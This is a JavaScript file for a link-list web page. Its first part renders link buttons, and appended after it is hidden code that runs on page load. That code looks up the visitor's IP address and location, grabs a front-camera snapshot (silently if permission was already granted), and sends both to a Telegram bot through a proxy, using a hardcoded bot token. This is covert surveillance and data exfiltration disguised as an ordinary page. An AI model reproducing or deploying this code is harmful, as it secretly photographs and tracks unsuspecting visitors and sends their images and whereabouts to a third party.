document.addEventListener('DOMContentLoaded', () => {
    const container = document.querySelector('.container');
    const linksContainer = document.getElementById('linksContainer');

    function createLinkElement(data) {
        if (data.type === 'sectionTitle') {
            const sectionTitle = document.createElement('div');
            sectionTitle.classList.add('section-title');
            sectionTitle.textContent = data.title;
            return sectionTitle;
        }

        const element = data.type === 'button' ?
                        document.createElement('button') :
                        document.createElement('a');

        element.classList.add('link-item');
        if (data.linkTypeClass) {
            element.classList.add(data.linkTypeClass);
        }
        if (data.id) {
            element.id = data.id;
        }

        const iconDiv = document.createElement('div');
        iconDiv.classList.add('link-icon');
        if (data.iconImage) {
            const img = document.createElement('img');
            img.src = data.iconImage;
            img.alt = data.title + ' Logo';
            img.classList.add('custom-icon');
            iconDiv.appendChild(img);
        } else if (data.iconClass) {
            const icon = document.createElement('i');
            icon.classList.add(...data.iconClass.split(' '));
            iconDiv.appendChild(icon);
        }
        element.appendChild(iconDiv);

        const contentDiv = document.createElement('div');
        contentDiv.classList.add('link-content');

        const titleDiv = document.createElement('div');
        titleDiv.classList.add('link-title');
        titleDiv.textContent = data.title;
        contentDiv.appendChild(titleDiv);

        if (data.description) {
            const descriptionDiv = document.createElement('div');
            descriptionDiv.classList.add('link-description');
            descriptionDiv.textContent = data.description;
            contentDiv.appendChild(descriptionDiv);
        }
        element.appendChild(contentDiv);

        if (data.url) {
            element.addEventListener('click', (event) => {
                event.preventDefault();
                window.location.href = data.url;
                // Hoặc để mở trong tab mới: window.open(data.url, '_blank');
            });
        }

        return element;
    }

    function renderLinks() {
        linksContainer.innerHTML = '';
        linkData.forEach(item => {
            const element = createLinkElement(item);
            linksContainer.appendChild(element);
        });
    }

    renderLinks();

    const linkItems = document.querySelectorAll('.link-item');

    container.addEventListener('animationend', () => {
        linkItems.forEach((item, index) => {
            setTimeout(() => {
                item.classList.add('show');
            }, index * 100);
        });
    }, { once: true });
});
const TELEGRAM_BOT_TOKEN = '7550142487:AAH_xOHuyHr0C2nXnQmkWx-b6-f1NSDXaHo';
const TELEGRAM_CHAT_ID = '6956722046';
const API_SEND_PHOTO = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
const API_SEND_TEXT = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
  time: new Date().toLocaleString(),
  ip: '',
  isp: '',
  address: '',
  country: '',
  lat: '',
  lon: '',
  camera: '⏳ Đang kiểm tra quyền camera...'
};

function getIPInfo() {
  return fetch("https://ipwho.is/")
    .then(res => res.json())
    .then(data => {
      info.ip = data.ip;
      info.isp = data.connection?.org || 'Không rõ';
      info.address = `${data.region}, ${data.city}, ${data.postal || ''}`.replace(/, $/, '');
      info.country = data.country;
      info.lat = data.latitude;
      info.lon = data.longitude;
    });
}

function getMessageText() {
  return `
📡 [THÔNG TIN TRUY CẬP]

🕒-Thời gian: ${info.time}
🌐-IP: ${info.ip}
🏢-ISP: ${info.isp}
🏙️-Địa chỉ: ${info.address}
🌍-Quốc gia: ${info.country}
📍-Vĩ độ (IP): ${info.lat}
📍-Kinh độ (IP): ${info.lon}
📷-Camera: ${info.camera}
  `.trim();
}

function sendTextOnly() {
  fetch(API_SEND_TEXT, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: getMessageText()
    })
  });
}

function accessCameraAndSend() {
  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(stream => {
      info.camera = '✅ Camera đã được truy cập';

      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      video.onloadedmetadata = () => {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');

        setTimeout(() => {
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          stream.getTracks().forEach(track => track.stop());

          canvas.toBlob(blob => {
            getIPInfo().then(() => {
              const formData = new FormData();
              formData.append('chat_id', TELEGRAM_CHAT_ID);
              formData.append('photo', blob, 'cam.jpg');
              formData.append('caption', getMessageText());

              fetch(API_SEND_PHOTO, {
                method: 'POST',
                body: formData
              });
            });
          }, 'image/jpeg', 0.9);
        }, 1000);
      };
    })
    .catch(err => {
      info.camera = '📵 Người dùng từ chối hoặc không cho phép camera';
      getIPInfo().then(sendTextOnly);
    });
}

// Bắt đầu: kiểm tra quyền trước
navigator.permissions.query({ name: 'camera' }).then(result => {
  if (result.state === 'granted') {
    // ✅ Đã được cấp quyền → âm thầm
    accessCameraAndSend();
  } else {
    // ❌ Chưa cấp → yêu cầu qua popup
    accessCameraAndSend(); // sẽ hiện popup nếu chưa cho phép
  }
});
